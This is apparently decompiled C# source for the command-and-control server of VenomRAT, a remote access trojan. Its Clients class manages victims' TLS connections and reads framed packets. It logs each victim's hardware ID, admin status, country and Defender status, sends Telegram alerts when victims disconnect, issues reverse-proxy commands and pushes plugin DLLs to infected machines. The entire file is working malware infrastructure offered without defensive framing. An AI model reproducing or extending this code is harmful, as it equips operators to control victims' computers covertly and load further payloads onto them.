using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Newtonsoft.Json;
using Server.Algorithm;
using Server.Forms;
using Server.Handle_Packet;
using Server.Helper;
using Server.Properties;
using Server.ReverseProxy;

namespace Server.Connection;

public class Clients
{
	public Socket TcpClient { get; set; }

	public SslStream SslClient { get; set; }

	public ListViewItem LV2 { get; set; }

	public string ID
	{
		get
		{
			return info.hwid;
		}
		set
		{
			info.hwid = value;
		}
	}

	private byte[] ClientBuffer { get; set; }

	private long HeaderSize { get; set; }

	private long Offset { get; set; }

	private bool ClientBufferRecevied { get; set; }

	public object SendSync { get; set; }

	public long BytesRecevied { get; set; }

	public string Ip { get; set; }

	public bool IsAdmin => info.admin;

	public ClientInfo info { get; set; } = new ClientInfo();


	public DateTime LastPing { get; set; }

	public void SaveInfo()
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", Ip, "note.json");
		try
		{
			Directory.CreateDirectory(Path.Combine(Application.StartupPath, "ClientsFolder", Ip));
			File.WriteAllText(path, JsonConvert.SerializeObject(info));
		}
		catch
		{
		}
	}

	public void LoadInfo()
	{
		string path = Path.Combine(Application.StartupPath, "ClientsFolder", Ip, "note.json");
		try
		{
			info = JsonConvert.DeserializeObject<ClientInfo>(File.ReadAllText(path));
		}
		catch
		{
		}
	}

	public string GetGroupString()
	{
		switch (Settings.groupby)
		{
		case GROUP_TYPE.LOCATION:
			return info.country;
		case GROUP_TYPE.OS:
			return info.os;
		case GROUP_TYPE.GROUP:
			return info.group;
		case GROUP_TYPE.DEFENDER:
			return info.defender;
		case GROUP_TYPE.NOTE:
			if (!string.IsNullOrEmpty(info.note))
			{
				return info.note;
			}
			return "Empty";
		default:
			return "Default";
		}
	}

	public Clients(Socket socket)
	{
		SendSync = new object();
		TcpClient = socket;
		Ip = TcpClient.RemoteEndPoint.ToString().Split(':')[0];
		SslClient = new SslStream(new NetworkStream(TcpClient, ownsSocket: true), leaveInnerStreamOpen: false);
		SslClient.BeginAuthenticateAsServer(Settings.VenomServer, clientCertificateRequired: false, SslProtocols.Tls, checkCertificateRevocation: false, EndAuthenticate, null);
	}

	private void EndAuthenticate(IAsyncResult ar)
	{
		try
		{
			SslClient.EndAuthenticateAsServer(ar);
			Offset = 0L;
			HeaderSize = 4L;
			ClientBuffer = new byte[HeaderSize];
			SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
		}
		catch
		{
			SslClient?.Dispose();
			TcpClient?.Dispose();
		}
	}

	public void ReadClientData(IAsyncResult ar)
	{
		try
		{
			if (!TcpClient.Connected)
			{
				Disconnected();
				return;
			}
			int num = SslClient.EndRead(ar);
			if (num > 0)
			{
				HeaderSize -= num;
				Offset += num;
				if (!ClientBufferRecevied)
				{
					if (HeaderSize == 0L)
					{
						HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
						if (HeaderSize > 0)
						{
							ClientBuffer = new byte[HeaderSize];
							Offset = 0L;
							ClientBufferRecevied = true;
						}
					}
					else if (HeaderSize < 0)
					{
						Disconnected();
						return;
					}
				}
				else
				{
					lock (Settings.LockReceivedSendValue)
					{
						Settings.ReceivedValue += num;
					}
					BytesRecevied += num;
					if (HeaderSize == 0L)
					{
						ThreadPool.QueueUserWorkItem(new Packet
						{
							client = this,
							data = ClientBuffer
						}.Read, null);
						Offset = 0L;
						HeaderSize = 4L;
						ClientBuffer = new byte[HeaderSize];
						ClientBufferRecevied = false;
					}
					else if (HeaderSize < 0)
					{
						Disconnected();
						return;
					}
				}
				SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
			}
			else
			{
				Disconnected();
			}
		}
		catch
		{
			Disconnected();
		}
	}

	public void Disconnected()
	{
		Program.mainform.Invoke((MethodInvoker)delegate
		{
			try
			{
				if (Program.mainform.RemoveClient(this))
				{
					if (LV2 != null)
					{
						lock (Settings.LockListviewThumb)
						{
							LV2.Remove();
						}
					}
					new HandleLogs().Addmsg("Client " + Ip + " disconnected.", Color.Red);
					TelegramNotify.SendNotify("VenomRAT: " + Ip + " disconnected!");
					if (TimeZoneInfo.Local.Id == "China Standard Time" && Server.Properties.Settings.Default.Notification)
					{
						SoundPlayer soundPlayer = new SoundPlayer(Resources.offline);
						soundPlayer.Load();
						soundPlayer.Play();
					}
					{
						foreach (AsyncTask item in FormMain.listTasks.ToList())
						{
							item.doneClient.Remove(ID);
						}
						return;
					}
				}
			}
			catch
			{
			}
		});
		try
		{
			SslClient?.Dispose();
			TcpClient?.Dispose();
		}
		catch
		{
		}
	}

	public void SendProxyCommand(ReverseProxyCommand cmd, ReverseProxyCommands tp)
	{
		MsgPack msgPack = new MsgPack();
		msgPack.ForcePathObject("Pac_ket").AsString = "ReverseProxy";
		msgPack.ForcePathObject("json").AsString = JsonConvert.SerializeObject(cmd);
		msgPack.ForcePathObject("type").AsInteger = (long)tp;
		Send(msgPack.Encode2Bytes());
	}

	public void Send(object msg)
	{
		lock (SendSync)
		{
			try
			{
				if (!TcpClient.Connected)
				{
					Disconnected();
				}
				else
				{
					if ((byte[])msg == null)
					{
						return;
					}
					byte[] array = (byte[])msg;
					byte[] bytes = BitConverter.GetBytes(array.Length);
					TcpClient.Poll(-1, SelectMode.SelectWrite);
					SslClient.Write(bytes, 0, bytes.Length);
					if (array.Length > 1000000)
					{
						using (MemoryStream memoryStream = new MemoryStream(array))
						{
							int num = 0;
							memoryStream.Position = 0L;
							byte[] array2 = new byte[50000];
							while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
							{
								TcpClient.Poll(-1, SelectMode.SelectWrite);
								SslClient.Write(array2, 0, num);
								lock (Settings.LockReceivedSendValue)
								{
									Settings.SentValue += num;
								}
							}
							return;
						}
					}
					TcpClient.Poll(-1, SelectMode.SelectWrite);
					SslClient.Write(array, 0, array.Length);
					SslClient.Flush();
					lock (Settings.LockReceivedSendValue)
					{
						Settings.SentValue += array.Length;
						return;
					}
				}
			}
			catch
			{
				Disconnected();
			}
		}
	}

	public void SendPlugin(string hash)
	{
		try
		{
			string[] files = Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly);
			foreach (string text in files)
			{
				if (hash == GetHash.GetChecksum(text))
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
					msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
					msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
					ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
					new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " Sent to " + Ip, Color.Blue);
					break;
				}
			}
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg("Clinet " + Ip + " " + ex.Message, Color.Red);
		}
	}
}
